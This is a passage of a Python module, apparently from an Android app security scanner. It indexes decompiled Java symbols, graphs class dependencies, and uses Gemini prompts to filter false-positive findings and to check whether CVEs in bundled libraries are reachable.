        "classes": {},  # class_name -> {file, line, package}
        "methods": {},  # method_name -> [{class, file, line, signature}]
        "fields": {},   # field_name -> [{class, file, line, type}]
    }
    
    # Patterns for extraction
    class_pattern = re.compile(r'^(?:public|private|protected)?\s*(?:abstract|final|static)?\s*(?:class|interface|enum)\s+(\w+)', re.MULTILINE)
    method_pattern = re.compile(r'^\s*(?:public|private|protected)?\s*(?:abstract|static|final|synchronized|native)?\s*(?:<[\w\s,]+>\s*)?(\w+(?:<[^>]+>)?|\w+)\s+(\w+)\s*\(([^)]*)\)\s*(?:throws\s+[\w\s,]+)?\s*\{?', re.MULTILINE)
    field_pattern = re.compile(r'^\s*(?:public|private|protected)?\s*(?:static|final|volatile|transient)?\s*(\w+(?:<[^>]+>)?)\s+(\w+)\s*[;=]', re.MULTILINE)
    
    files_indexed = 0
    
    for java_file in sources_dir.rglob("*.java"):
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            files_indexed += 1
            
            # Extract package
            package_match = re.search(r'^package\s+([\w\.]+)\s*;', content, re.MULTILINE)
            package_name = package_match.group(1) if package_match else ""
            
            # Find class definitions
            for match in class_pattern.finditer(content):
                class_name = match.group(1)
                line_num = content[:match.start()].count('\n') + 1
                full_name = f"{package_name}.{class_name}" if package_name else class_name
                
                symbols["classes"][class_name] = {
                    "file": rel_path,
                    "line": line_num,
                    "package": package_name,
                    "full_name": full_name
                }
                
                # Also index by full name
                symbols["classes"][full_name] = symbols["classes"][class_name]
            
            # Find method definitions (only in class context)
            for match in method_pattern.finditer(content):
                return_type = match.group(1)
                method_name = match.group(2)
                params = match.group(3).strip()
                line_num = content[:match.start()].count('\n') + 1
                
                # Skip constructors (they match too)
                if method_name in symbols["classes"]:
                    continue
                
                # Find containing class
                class_context = None
                for class_name, class_info in symbols["classes"].items():
                    if class_info["file"] == rel_path:
                        class_context = class_name
                        break
                
                if method_name not in symbols["methods"]:
                    symbols["methods"][method_name] = []
                
                symbols["methods"][method_name].append({
                    "class": class_context,
                    "file": rel_path,
                    "line": line_num,
                    "return_type": return_type,
                    "params": params,
                    "signature": f"{return_type} {method_name}({params})"
                })
            
            # Find field definitions
            for match in field_pattern.finditer(content):
                field_type = match.group(1)
                field_name = match.group(2)
                line_num = content[:match.start()].count('\n') + 1
                
                # Skip common names that are likely not fields
                if field_name in ["if", "for", "while", "return", "new", "this"]:
                    continue
                
                class_context = None
                for class_name, class_info in symbols["classes"].items():
                    if class_info["file"] == rel_path:
                        class_context = class_name
                        break
                
                if field_name not in symbols["fields"]:
                    symbols["fields"][field_name] = []
                
                symbols["fields"][field_name].append({
                    "class": class_context,
                    "file": rel_path,
                    "line": line_num,
                    "type": field_type
                })
        
        except Exception as e:
            continue
    
    return {
        "symbols": symbols,
        "stats": {
            "classes": len(symbols["classes"]),
            "methods": len(symbols["methods"]),
            "fields": len(symbols["fields"]),
            "files_indexed": files_indexed
        }
    }


def lookup_symbol(output_dir: Path, symbol: str, symbol_type: Optional[str] = None) -> Dict[str, Any]:
    """
    Look up a symbol (class, method, or field) and return its definition location.
    
    Args:
        output_dir: JADX output directory
        symbol: The symbol name to look up
        symbol_type: Optional type filter ('class', 'method', 'field')
    
    Returns:
        Dictionary with lookup results
    """
    # Build index (could be cached in production)
    index_result = build_symbol_index(output_dir)
    
    if "error" in index_result:
        return index_result
    
    symbols = index_result["symbols"]
    results = []
    
    # Search classes
    if symbol_type is None or symbol_type == "class":
        if symbol in symbols["classes"]:
            info = symbols["classes"][symbol]
            results.append({
                "type": "class",
                "name": symbol,
                "file": info["file"],
                "line": info["line"],
                "package": info.get("package", ""),
                "full_name": info.get("full_name", symbol)
            })
        else:
            # Partial match
            for class_name, info in symbols["classes"].items():
                if symbol.lower() in class_name.lower():
                    results.append({
                        "type": "class",
                        "name": class_name,
                        "file": info["file"],
                        "line": info["line"],
                        "package": info.get("package", ""),
                        "full_name": info.get("full_name", class_name)
                    })
    
    # Search methods
    if symbol_type is None or symbol_type == "method":
        if symbol in symbols["methods"]:
            for method_info in symbols["methods"][symbol]:
                results.append({
                    "type": "method",
                    "name": symbol,
                    "class": method_info.get("class"),
                    "file": method_info["file"],
                    "line": method_info["line"],
                    "signature": method_info.get("signature", ""),
                    "return_type": method_info.get("return_type", ""),
                    "params": method_info.get("params", "")
                })
        else:
            # Partial match for methods
            for method_name, method_list in symbols["methods"].items():
                if symbol.lower() in method_name.lower():
                    for method_info in method_list[:3]:  # Limit matches
                        results.append({
                            "type": "method",
                            "name": method_name,
                            "class": method_info.get("class"),
                            "file": method_info["file"],
                            "line": method_info["line"],
                            "signature": method_info.get("signature", "")
                        })
    
    # Search fields
    if symbol_type is None or symbol_type == "field":
        if symbol in symbols["fields"]:
            for field_info in symbols["fields"][symbol]:
                results.append({
                    "type": "field",
                    "name": symbol,
                    "class": field_info.get("class"),
                    "file": field_info["file"],
                    "line": field_info["line"],
                    "field_type": field_info.get("type", "")
                })
    
    # Limit and sort results
    results = results[:50]  # Limit total results
    results.sort(key=lambda r: (
        0 if r["type"] == "class" else 1 if r["type"] == "method" else 2,
        r["name"].lower() != symbol.lower(),  # Exact matches first
        len(r["name"])  # Shorter names first
    ))
    
    return {
        "symbol": symbol,
        "results": results,
        "total_found": len(results),
        "index_stats": index_result["stats"]
    }


def generate_class_dependency_graph(output_dir: Path, max_classes: int = 100) -> Dict[str, Any]:
    """
    Generate a class dependency graph showing how classes are interconnected.
    
    This analyzes:
    - Import statements (which classes depend on which)
    - Inheritance (extends)
    - Interface implementation (implements)
    - Method calls to other classes
    
    Args:
        output_dir: JADX output directory
        max_classes: Maximum number of classes to include (for performance)
    
    Returns:
        Dictionary with nodes (classes) and edges (dependencies) for visualization
    """
    import re
    from collections import defaultdict
    
    output_dir = Path(output_dir)
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found"}
    
    # Data structures
    nodes = []
    edges = []
    classes_info = {}
    package_stats = defaultdict(int)
    
    # First pass: collect all class names
    all_classes = set()
    for java_file in sources_dir.rglob("*.java"):
        rel_path = str(java_file.relative_to(sources_dir))
        class_name = java_file.stem
        all_classes.add(class_name)
    
    # Second pass: analyze dependencies
    processed = 0
    for java_file in sources_dir.rglob("*.java"):
        if processed >= max_classes:
            break
            
        try:
            source_code = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            class_name = java_file.stem
            
            # Extract package
            package_match = re.search(r'package\s+([\w.]+)\s*;', source_code)
            package_name = package_match.group(1) if package_match else "default"
            full_class_name = f"{package_name}.{class_name}"
            
            # Track package statistics
            base_pkg = '.'.join(package_name.split('.')[:3])
            package_stats[base_pkg] += 1
            
            # Determine class type
            is_activity = bool(re.search(r'extends\s+\w*Activity', source_code))
            is_service = bool(re.search(r'extends\s+\w*Service', source_code))
            is_receiver = bool(re.search(r'extends\s+\w*Receiver', source_code))
            is_provider = bool(re.search(r'extends\s+\w*Provider', source_code))
            is_fragment = bool(re.search(r'extends\s+\w*Fragment', source_code))
            is_adapter = bool(re.search(r'extends\s+\w*Adapter', source_code))
            is_interface = bool(re.search(r'^\s*(?:public\s+)?interface\s+', source_code, re.MULTILINE))
            is_abstract = bool(re.search(r'^\s*(?:public\s+)?abstract\s+class', source_code, re.MULTILINE))
            
            # Determine node type and color
            if is_activity:
                node_type = "activity"
                color = "#4CAF50"  # Green
            elif is_service:
                node_type = "service"
                color = "#2196F3"  # Blue
            elif is_receiver:
                node_type = "receiver"
                color = "#FF9800"  # Orange
            elif is_provider:
                node_type = "provider"
                color = "#9C27B0"  # Purple
            elif is_fragment:
                node_type = "fragment"
                color = "#00BCD4"  # Cyan
            elif is_adapter:
                node_type = "adapter"
                color = "#795548"  # Brown
            elif is_interface:
                node_type = "interface"
                color = "#607D8B"  # Blue Grey
            elif is_abstract:
                node_type = "abstract"
                color = "#9E9E9E"  # Grey
            else:
                node_type = "class"
                color = "#78909C"  # Blue Grey Light
            
            # Count methods and lines
            methods = re.findall(r'(?:public|private|protected)\s+[\w<>\[\]]+\s+(\w+)\s*\(', source_code)
            line_count = source_code.count('\n')
            
            # Store class info
            classes_info[class_name] = {
                "full_name": full_class_name,
                "package": package_name,
                "type": node_type,
                "file_path": rel_path,
            }
            
            # Create node
            nodes.append({
                "id": class_name,
                "label": class_name,
                "full_name": full_class_name,
                "package": package_name,
                "type": node_type,
                "color": color,
                "size": min(30, 10 + len(methods)),  # Size based on methods
                "methods": len(methods),
                "lines": line_count,
                "file_path": rel_path,
            })
            
            # Extract imports
            imports = re.findall(r'import\s+([\w.]+);', source_code)
            for imp in imports:
                imported_class = imp.split('.')[-1]
                if imported_class in all_classes and imported_class != class_name:
                    edges.append({
                        "from": class_name,
                        "to": imported_class,
                        "type": "imports",
                        "color": "#90A4AE",
                        "dashes": True,
                    })
            
            # Extract extends
            extends_match = re.search(r'extends\s+([\w.]+)', source_code)
            if extends_match:
                parent = extends_match.group(1).split('.')[-1]
                if parent in all_classes:
                    edges.append({
                        "from": class_name,
                        "to": parent,
                        "type": "extends",
                        "color": "#4CAF50",
                        "width": 3,
                    })
            
            # Extract implements
            implements_match = re.search(r'implements\s+([\w.,\s]+)(?:\s*\{)', source_code)
            if implements_match:
                interfaces = [i.strip().split('.')[-1] for i in implements_match.group(1).split(',')]
                for iface in interfaces:
                    if iface in all_classes:
                        edges.append({
                            "from": class_name,
                            "to": iface,
                            "type": "implements",
                            "color": "#2196F3",
                            "dashes": [5, 5],
                        })
            
            # Extract method calls to other classes (simplified)
            # Look for patterns like ClassName.method() or new ClassName()
            method_calls = re.findall(r'(?:new\s+|(\w+)\.)\s*(\w+)\s*\(', source_code)
            called_classes = set()
            for caller, method in method_calls:
                if caller and caller[0].isupper() and caller in all_classes and caller != class_name:
                    called_classes.add(caller)
            
            for called in called_classes:
                edges.append({
                    "from": class_name,
                    "to": called,
                    "type": "calls",
                    "color": "#FF5722",
                    "dashes": [2, 2],
                    "width": 1,
                })
            
            processed += 1
            
        except Exception as e:
            continue
    
    # Calculate statistics
    edge_type_counts = defaultdict(int)
    for edge in edges:
        edge_type_counts[edge["type"]] += 1
    
    node_type_counts = defaultdict(int)
    for node in nodes:
        node_type_counts[node["type"]] += 1
    
    # Find hub classes (most connections)
    connection_counts = defaultdict(int)
    for edge in edges:
        connection_counts[edge["from"]] += 1
        connection_counts[edge["to"]] += 1
    
    hub_classes = sorted(connection_counts.items(), key=lambda x: x[1], reverse=True)[:10]
    
    return {
        "nodes": nodes,
        "edges": edges,
        "statistics": {
            "total_classes": len(nodes),
            "total_connections": len(edges),
            "node_types": dict(node_type_counts),
            "edge_types": dict(edge_type_counts),
            "packages": dict(sorted(package_stats.items(), key=lambda x: x[1], reverse=True)[:10]),
            "hub_classes": [{"name": name, "connections": count} for name, count in hub_classes],
        },
        "legend": {
            "node_colors": {
                "activity": "#4CAF50",
                "service": "#2196F3",
                "receiver": "#FF9800",
                "provider": "#9C27B0",
                "fragment": "#00BCD4",
                "adapter": "#795548",
                "interface": "#607D8B",
                "abstract": "#9E9E9E",
                "class": "#78909C",
            },
            "edge_types": {
                "extends": "Inheritance (solid green)",
                "implements": "Interface (dashed blue)",
                "imports": "Import (dashed grey)",
                "calls": "Method call (dotted orange)",
            }
        }
    }


# ============================================================================
# AI-Powered False Positive Filtering
# ============================================================================

async def _filter_findings_with_ai(
    findings: List[Dict[str, Any]],
    sources_dir: Path,
    batch_size: int = 15
) -> List[Dict[str, Any]]:
    """
    Use Gemini AI to filter out false positives from pattern-detected findings.
    
    Analyzes each finding in context and determines if it's:
    - A real vulnerability (keep)
    - A false positive (remove)
    - Context-dependent (keep with lower confidence)
    
    Args:
        findings: List of pattern-detected findings with file_content
        sources_dir: Path to decompiled sources
        batch_size: Number of findings to analyze per API call
        
    Returns:
        Filtered list of findings (only real vulnerabilities)
    """
    from google import genai
    from google.genai import types
    import json
    
    if not findings:
        return []
    
    client = genai.Client(api_key=settings.gemini_api_key)
    filtered_findings = []
    
    # Group findings by severity - prioritize critical/high for detailed review
    critical_high = [f for f in findings if f.get("severity") in ["critical", "high"]]
    medium_low = [f for f in findings if f.get("severity") in ["medium", "low"]]
    
    # Process critical/high findings individually or in small batches
    for i in range(0, len(critical_high), batch_size):
        batch = critical_high[i:i + batch_size]
        
        # Prepare findings for AI review
        findings_for_review = []
        for idx, finding in enumerate(batch):
            # Get surrounding context (lines around the finding)
            file_content = finding.get("file_content", "")
            line_num = finding.get("line", 0)
            lines = file_content.split('\n')
            
            # Get 10 lines before and after for context
            start_line = max(0, line_num - 11)
            end_line = min(len(lines), line_num + 10)
            context_lines = lines[start_line:end_line]
            context = '\n'.join(context_lines)
            
            findings_for_review.append({
                "id": idx,
                "type": finding.get("type", "Unknown"),
                "severity": finding.get("severity", "medium"),
                "description": finding.get("description", ""),
                "class": finding.get("affected_class", ""),
                "line": line_num,
                "code_snippet": finding.get("code_snippet", ""),
                "context": context[:2000]  # Limit context size
            })
        
        prompt = f"""You are an expert Android security researcher reviewing potential vulnerabilities detected by pattern matching. Your job is to filter out FALSE POSITIVES.

For each finding below, analyze the code context and determine if it's:
1. **REAL** - A genuine security vulnerability that should be reported
2. **FALSE_POSITIVE** - Not a real vulnerability (e.g., in test code, comments, properly sanitized, framework code, or benign usage)
3. **NEEDS_REVIEW** - Unclear, keep but flag for manual review

Common false positive patterns to look for:
- Code in comments or documentation
- Test/mock/fake classes
- Framework/library internal code
- Properly secured implementations (e.g., HTTPS URLs, proper crypto usage)
- Debug/development code that won't be in production
- Safe defaults or placeholders
- URLs to documentation or examples (not real endpoints)

Review these {len(findings_for_review)} findings:

{json.dumps(findings_for_review, indent=2)}

Respond with a JSON array of verdicts:
[
  {{"id": 0, "verdict": "REAL|FALSE_POSITIVE|NEEDS_REVIEW", "reason": "Brief explanation"}},
  ...
]

Be strict about false positives - only mark as REAL if you're confident it's exploitable."""

        try:
            response = sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=90.0,
                operation_name="AI false positive filtering"
            )
            
            if response is None:
                # If AI fails, keep all findings from batch
                filtered_findings.extend(batch)
                continue
            
            response_text = response.text
            
            # Extract JSON array from response
            json_match = re.search(r'\[[\s\S]*\]', response_text)
            if json_match:
                verdicts = json.loads(json_match.group())
                verdict_map = {v.get("id"): v for v in verdicts}
                
                # Keep only REAL and NEEDS_REVIEW findings
                for idx, finding in enumerate(batch):
                    verdict = verdict_map.get(idx, {})
                    verdict_type = verdict.get("verdict", "NEEDS_REVIEW")
                    
                    if verdict_type in ["REAL", "NEEDS_REVIEW"]:
                        finding["ai_verdict"] = verdict_type
                        finding["ai_reason"] = verdict.get("reason", "")
                        if verdict_type == "NEEDS_REVIEW":
                            finding["needs_manual_review"] = True
                        filtered_findings.append(finding)
                    # FALSE_POSITIVE findings are dropped
            else:
                # If parsing fails, keep all findings from this batch
                filtered_findings.extend(batch)
                
        except Exception as e:
            logger.warning(f"AI filtering batch failed: {e}, keeping all findings from batch")
            filtered_findings.extend(batch)
    
    # For medium/low severity, do quick batch filtering
    if medium_low:
        # Summarize medium/low findings for faster processing
        summary_findings = []
        for idx, finding in enumerate(medium_low):
            summary_findings.append({
                "id": idx,
                "type": finding.get("type", "Unknown"),
                "severity": finding.get("severity", "medium"),
                "class": finding.get("affected_class", ""),
                "code_snippet": finding.get("code_snippet", "")[:100]
            })
        
        # Process in larger batches for medium/low
        for i in range(0, len(summary_findings), 30):
            batch_summary = summary_findings[i:i + 30]
            batch_findings = medium_low[i:i + 30]
            
            prompt = f"""You are filtering low/medium severity security findings for false positives.

Quick review - mark each as KEEP or DROP based on the pattern and class name:
- DROP: Test classes, mock data, framework internals, safe patterns, comments
- KEEP: App-specific code with real security concerns

Findings:
{json.dumps(batch_summary, indent=2)}

Respond with JSON: [{{"id": 0, "keep": true/false}}, ...]"""

            try:
                response = sync_gemini_request_with_retry(
                    lambda: client.models.generate_content(
                        model=settings.gemini_model_id,
                        contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                    ),
                    max_retries=3,
                    base_delay=2.0,
                    timeout_seconds=90.0,
                    operation_name="AI medium/low severity filtering"
                )
                
                if response is None:
                    filtered_findings.extend(batch_findings)
                    continue
                
                json_match = re.search(r'\[[\s\S]*\]', response.text)
                if json_match:
                    verdicts = json.loads(json_match.group())
                    verdict_map = {v.get("id"): v.get("keep", True) for v in verdicts}
                    
                    for idx, finding in enumerate(batch_findings):
                        if verdict_map.get(idx, True):
                            finding["ai_verdict"] = "REAL"
                            filtered_findings.append(finding)
                else:
                    filtered_findings.extend(batch_findings)
                    
            except Exception as e:
                logger.warning(f"AI filtering (medium/low) failed: {e}")
                filtered_findings.extend(batch_findings)
    
    return filtered_findings


# ============================================================================
# FIX #3: Field Name Normalization
# Standardizes field names across different scanners for consistent processing
# ============================================================================

def normalize_finding_fields(finding: Dict[str, Any], source: str = "unknown") -> Dict[str, Any]:
    """
    Normalize finding fields to a consistent schema.
    
    Different scanners use different field names:
    - Pattern scanner: file_path, line_number, code_snippet, class_name
    - Vuln hunt: affected_class, line, code, class
    - Sensitive data: file_path, line, code_context
    - CVE: library, cve_id, severity
    
    This function normalizes to a consistent schema:
    - file_path: Path to the file
    - line_number: Line number in file
    - code_snippet: Relevant code
    - class_name: Class name
    - source: Which scanner found this
    """
    normalized = finding.copy()
    
    # Normalize file path
    if "file_path" not in normalized or not normalized.get("file_path"):
        normalized["file_path"] = (
            finding.get("affected_class") or
            finding.get("class") or
            finding.get("file") or
            ""
        )
    
    # Normalize line number
    if "line_number" not in normalized or not normalized.get("line_number"):
        normalized["line_number"] = (
            finding.get("line") or
            finding.get("line_num") or
            0
        )
    
    # Normalize code snippet
    if "code_snippet" not in normalized or not normalized.get("code_snippet"):
        normalized["code_snippet"] = (
            finding.get("code") or
            finding.get("code_context") or
            finding.get("snippet") or
            ""
        )
    
    # Normalize class name
    if "class_name" not in normalized or not normalized.get("class_name"):
        file_path = normalized.get("file_path", "")
        if file_path:
            # Extract class name from path
            normalized["class_name"] = Path(file_path).stem if "/" in file_path or "\\" in file_path else file_path.replace(".java", "")
        else:
            normalized["class_name"] = finding.get("class", "Unknown")
    
    # Add/update source
    if "source" not in normalized or not normalized.get("source"):
        normalized["source"] = source
    
    # Ensure severity exists
    if "severity" not in normalized:
        normalized["severity"] = finding.get("risk_level", "medium")
    
    # Ensure title exists
    if "title" not in normalized:
        normalized["title"] = (
            finding.get("type") or
            finding.get("category") or
            finding.get("cve_id") or
            "Unknown Finding"
        )
    
    return normalized


def normalize_findings_batch(findings: List[Dict[str, Any]], source: str = "unknown") -> List[Dict[str, Any]]:
    """Normalize a batch of findings to consistent field names."""
    return [normalize_finding_fields(f, source) for f in findings]


# ============================================================================
# FIX #1: CVE Reachability Verification
# Validates whether CVE-affected code is actually reachable in the app
# ============================================================================

async def verify_cve_reachability(
    cve_findings: List[Dict[str, Any]],
    sources_dir: Path,
    package_name: str = ""
) -> Dict[str, Any]:
    """
    Verify CVE findings by checking if vulnerable library code is actually used.
    
    This prevents false positives from CVEs in libraries that are included
    but never actually called by the app code.
    
    Args:
        cve_findings: List of CVE findings with library info
        sources_dir: Path to decompiled sources
        package_name: App package name
        
    Returns:
        {
            "verified_cves": [...],     # CVEs with reachable vulnerable code
            "unreachable_cves": [...],  # CVEs in unused library code
            "verification_stats": {...}
        }
    """
    from google import genai
    from google.genai import types
    
    if not cve_findings:
        return {
            "verified_cves": [],
            "unreachable_cves": [],
            "verification_stats": {"total": 0, "reachable": 0, "unreachable": 0}
        }
    
    if not settings.gemini_api_key:
        logger.warning("Gemini API key not configured - skipping CVE reachability check")
        # Return all as verified (conservative approach)
        return {
            "verified_cves": cve_findings,
            "unreachable_cves": [],
            "verification_stats": {
                "total": len(cve_findings),
                "reachable": len(cve_findings),
                "unreachable": 0,
                "skipped_reason": "AI API key not configured"
            }
        }
    
    logger.info(f"CVE reachability check: Analyzing {len(cve_findings)} CVEs")
    client = genai.Client(api_key=settings.gemini_api_key)
    
    verified_cves = []
    unreachable_cves = []
    
    # Collect app imports to check library usage
    app_imports = set()
    library_usages = {}
    
    try:
        for java_file in sources_dir.rglob("*.java"):
            try:
                content = java_file.read_text(encoding='utf-8', errors='ignore')
                
                # Extract imports
                import_matches = re.findall(r'^import\s+([\w\.]+);', content, re.MULTILINE)
                app_imports.update(import_matches)
                
                # Track which library classes are actually used in code
                for imp in import_matches:
                    lib_prefix = '.'.join(imp.split('.')[:3])  # e.g., com.squareup.okhttp
                    if lib_prefix not in library_usages:
                        library_usages[lib_prefix] = {"count": 0, "files": []}
                    library_usages[lib_prefix]["count"] += 1
                    library_usages[lib_prefix]["files"].append(str(java_file.name))
            except:
                continue
    except Exception as e:
        logger.warning(f"Failed to collect app imports: {e}")
    
    # Process CVEs in batches
    batch_size = 10
    for i in range(0, len(cve_findings), batch_size):
        batch = cve_findings[i:i + batch_size]
        
        # Build context for AI verification
        cve_context = []
        for idx, cve in enumerate(batch):
            library = cve.get("library", "")
            # Check if library is imported anywhere
            lib_parts = library.replace("-", ".").replace("_", ".").split(":")
            lib_package = lib_parts[0] if lib_parts else library
            
            usage_info = "NOT FOUND IN IMPORTS"
            for imp_prefix, usage in library_usages.items():
                if lib_package.lower() in imp_prefix.lower() or imp_prefix.lower() in lib_package.lower():
                    usage_info = f"IMPORTED {usage['count']} times in: {', '.join(usage['files'][:5])}"
                    break
            
            cve_context.append({
                "id": idx,
                "cve_id": cve.get("cve_id", "Unknown"),
                "library": library,
                "version": cve.get("library_version", ""),
                "severity": cve.get("severity", ""),
                "summary": cve.get("summary", "")[:200],
                "vulnerable_function": cve.get("vulnerable_function", ""),
                "usage_in_app": usage_info
            })
        
        prompt = f"""Analyze these CVE findings for an Android app to determine if the vulnerable code is actually REACHABLE.

## App Package: {package_name}

## App Imports (libraries actually used):
{json.dumps(list(app_imports)[:100], indent=2)}

## CVEs to Analyze:
{json.dumps(cve_context, indent=2)}

## Task
For each CVE, determine:
1. Is the vulnerable library actually imported/used by the app?
2. Is the specific vulnerable functionality likely to be called?
3. Could this CVE actually be exploited given how the app uses the library?

Return JSON:
```json
[
  {{
    "id": 0,
    "reachable": true/false,
    "confidence": 0-100,
    "reasoning": "Brief explanation",
    "exploitation_likelihood": "high/medium/low/none",
    "affected_functionality": "What app functionality might be vulnerable"
  }}
]
```

Be CONSERVATIVE - if the library is imported, assume reachable unless you have strong evidence otherwise.
Focus on whether the SPECIFIC vulnerable functions/classes are likely used."""

        try:
            response = await gemini_request_with_retry(
                lambda: client.aio.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=90.0,
                operation_name="CVE reachability verification"
            )
            
            if response is None:
                # On failure, assume all reachable (conservative)
                verified_cves.extend(batch)
                continue
            
            # Parse response
            json_match = re.search(r'\[[\s\S]*\]', response.text)
            if json_match:
                verdicts = json.loads(json_match.group())
                verdict_map = {v.get("id"): v for v in verdicts}
                
                for idx, cve in enumerate(batch):
                    verdict = verdict_map.get(idx, {})
                    is_reachable = verdict.get("reachable", True)  # Default to reachable
                    
                    # Add verification info
                    cve["reachability"] = {
                        "verified": True,
                        "reachable": is_reachable,
                        "confidence": verdict.get("confidence", 50),
                        "reasoning": verdict.get("reasoning", ""),
                        "exploitation_likelihood": verdict.get("exploitation_likelihood", "unknown"),
                        "affected_functionality": verdict.get("affected_functionality", "")
                    }
                    
                    if is_reachable:
                        verified_cves.append(cve)
                    else:
                        cve["filtered_reason"] = verdict.get("reasoning", "Vulnerable code not reachable")
                        unreachable_cves.append(cve)
            else:
                # Parsing failed - keep all (conservative)
                verified_cves.extend(batch)
                
        except Exception as e:
            logger.warning(f"CVE reachability batch failed: {e}")
            verified_cves.extend(batch)
    
    stats = {
        "total": len(cve_findings),
        "reachable": len(verified_cves),
        "unreachable": len(unreachable_cves),
        "filter_rate": round(len(unreachable_cves) / max(len(cve_findings), 1) * 100, 1)
    }
    
    logger.info(f"CVE reachability: {len(verified_cves)} reachable, {len(unreachable_cves)} unreachable")
    
    return {
        "verified_cves": verified_cves,
        "unreachable_cves": unreachable_cves,
        "verification_stats": stats
    }


# ============================================================================
# Unified Finding Verification Layer
# Runs on ALL findings with confidence scoring and cross-correlation
# ============================================================================

async def verify_findings_unified(
    findings: List[Dict[str, Any]],
    sources_dir: Path,
    package_name: str = "",
    batch_size: int = 20
) -> Dict[str, Any]:
    """
    Unified verification layer that runs on ALL findings to eliminate false positives.
    
    This is a comprehensive verification pass that:
    1. Groups and correlates related findings
    2. Validates each finding against actual source code
    3. Assigns confidence scores (0-100)
    4. Identifies attack chains from correlated findings
    5. Provides actionable verdict with reasoning
    
    Args:
        findings: List of ALL findings (pattern + AI + vuln hunt combined)
        sources_dir: Path to decompiled sources for code context
        package_name: App package name for context
        batch_size: Findings to process per AI call
        
    Returns:
        {
            "verified_findings": [...],  # Findings with confidence scores
            "filtered_out": [...],       # Removed false positives  
            "attack_chains": [...],      # Correlated attack paths
            "verification_stats": {...}, # Summary statistics
        }
    """
    from google import genai
    from google.genai import types
    import json
    
    if not findings:
        return {
            "verified_findings": [],
            "filtered_out": [],
            "attack_chains": [],
            "verification_stats": {
                "total_input": 0,
                "verified": 0,
                "filtered": 0,
                "attack_chains_found": 0
            }
        }
    
    # Check for API key - if not available, return findings as-is without verification
    if not settings.gemini_api_key:
        logger.warning("Gemini API key not configured - skipping AI verification")
        return {
            "verified_findings": findings,  # Return unverified
            "filtered_out": [],
            "attack_chains": [],
            "verification_stats": {
                "total_input": len(findings),
                "verified": 0,
                "filtered": 0,
                "attack_chains_found": 0,
                "skipped_reason": "AI API key not configured"
            }
        }
    
    logger.info(f"Unified verification: Processing {len(findings)} findings")
    client = genai.Client(api_key=settings.gemini_api_key)
    
    verified_findings = []
    filtered_out = []
    attack_chains = []
    
    # ========================================================================
    # Step 1: Group findings by location for correlation
    # ========================================================================
    location_groups = {}
    for finding in findings:
        file_path = finding.get("file_path") or finding.get("affected_class") or finding.get("class") or ""
        # Normalize path
        file_path = file_path.replace("\\", "/").lower()
        file_key = file_path.split("/")[-1] if file_path else "unknown"
        
        if file_key not in location_groups:
            location_groups[file_key] = []
        location_groups[file_key].append(finding)
    
    # ========================================================================
    # Step 2: Read source code context for each file
    # ========================================================================
    source_cache = {}
    
    def get_source_context(finding: Dict[str, Any]) -> str:
        """Get source code context around a finding with robust error handling."""
        try:
            file_path = finding.get("file_path") or finding.get("affected_class") or finding.get("class") or ""
            if not file_path:
                return finding.get("code_snippet", "") or ""
            
            # Ensure file_path is a string
            file_path = str(file_path)
            
            # Try to find and read the file
            if file_path in source_cache:
                source_lines = source_cache[file_path]
            else:
                # Build potential paths safely
                potential_paths = []
                try:
                    potential_paths.append(sources_dir / file_path)
                    # Safely build .java path
                    java_path = file_path.replace(".", "/") + ".java"
                    potential_paths.append(sources_dir / java_path)
                    potential_paths.append(sources_dir / "sources" / file_path)
                except Exception:
                    pass
                
                source_lines = None
                for p in potential_paths:
                    try:
                        if p.exists():
                            source_lines = p.read_text(encoding='utf-8', errors='ignore').split('\n')
                            source_cache[file_path] = source_lines
                            break
                    except Exception:
                        continue
                
                if source_lines is None:
                    # Try globbing
                    try:
                        pattern = f"**/{file_path.split('/')[-1]}" if "/" in file_path else f"**/{file_path}.java"
                        matches = list(sources_dir.rglob(pattern))
                        if matches:
                            source_lines = matches[0].read_text(encoding='utf-8', errors='ignore').split('\n')
                            source_cache[file_path] = source_lines
                    except Exception:
                        pass
            
            if not source_lines:
                return finding.get("code_snippet", "") or ""
            
            # Get lines around the finding
            line_num = finding.get("line") or finding.get("line_number") or 0
            if not isinstance(line_num, int):
                try:
                    line_num = int(line_num)
                except (ValueError, TypeError):
                    line_num = 0
            start = max(0, line_num - 15)
            end = min(len(source_lines), line_num + 15)
            
            context = '\n'.join(f"{i+1}: {line}" for i, line in enumerate(source_lines[start:end], start=start))
            return context[:5000]  # Increased for better verification context
        except Exception as e:
            logger.debug(f"Error getting source context: {e}")
            return finding.get("code_snippet", "") or ""
    
    # ========================================================================
    # Step 3: Process findings in batches with AI verification
    # ========================================================================
    
    # Sort by severity - process critical/high first
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    sorted_findings = sorted(
        findings, 
        key=lambda f: severity_order.get((f.get("severity") or "medium").lower(), 2)
    )
    
    for i in range(0, len(sorted_findings), batch_size):
        batch = sorted_findings[i:i + batch_size]
        
        # Prepare findings with context
        findings_for_review = []
        for idx, finding in enumerate(batch):
            source_context = get_source_context(finding)
            
            findings_for_review.append({
                "id": idx,
                "title": finding.get("title") or finding.get("type") or "Unknown",
                "severity": finding.get("severity", "medium"),
                "category": finding.get("category") or finding.get("type", ""),
                "description": finding.get("description", "")[:500],
                "class": finding.get("affected_class") or finding.get("class") or finding.get("file_path", ""),
                "line": finding.get("line") or finding.get("line_number", 0),
                "code_snippet": finding.get("code_snippet", "")[:300],
                "source_context": source_context[:2000],
                "source": finding.get("source", "pattern"),  # pattern, ai, vuln_hunt
            })
        
        prompt = f"""You are a senior security researcher performing the FINAL verification pass on security findings for an Android app.

CRITICAL: This is the last chance to remove FALSE POSITIVES. Be thorough but skeptical.

## App Context
Package: {package_name}

## Findings to Verify ({len(findings_for_review)} findings)

{json.dumps(findings_for_review, indent=2)}

## Your Task

For EACH finding, analyze the source context and determine:

1. **Verdict**: 
   - `CONFIRMED` - Real vulnerability with exploitation potential
